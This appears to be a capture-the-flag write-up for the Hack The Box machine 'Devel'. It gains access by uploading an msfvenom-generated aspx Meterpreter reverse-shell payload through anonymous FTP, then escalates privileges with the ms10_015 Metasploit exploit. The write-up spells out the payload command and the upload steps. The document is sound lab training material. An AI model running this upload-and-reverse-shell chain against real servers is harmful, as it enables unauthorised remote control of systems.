excerpt: This is an easy level box. We have anonymous access through FTP through which we can upload a shell. Then we use ms10_015 exploit to gain root.

## Enumeration

### NMAP

`nmap` shows that we have 2 ports open, FTP and HTTP:

### FTP

First, I created a test file to test if we can use the `put` command.

Looks like we can.

Before we continue, let's take a look at the site.

### Website

Looking at wappalyzer:

![wappalyzer](/assets/img/htb/devel/wappalyzer.png)

We can see it's running `ASP.NET`, which means when we upload our shell, we will have to use a `aspx` file.

We'll make our payload with `msfvenom`:

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=$IP LPORT=$PORT -f aspx > reverse.aspx
```

We will use `put` to upload our payload onto the ftp server:

`put reverse.aspx`

Next we will set up our metasploit to receive the connection. Then just navigate to your shell that you uploaded.

![meterpreter](/assets/img/htb/devel/meterpreter.png)

As you can see we got the connection back and got a shell.

### PrivEsc

We can try `local_exploit_suggester` module from metasploit. We will have to background our session with `CTRL+Z` and type `use post/multi/recon/local_exploit_suggester`, then we will set our session with `set session $session`.

We will try the infamous `ms10_015` exploit. The one thing to note is you have to check to see if all your options are set correctly, you may have to change your LHOST again and the port to a different one.

ROOT!
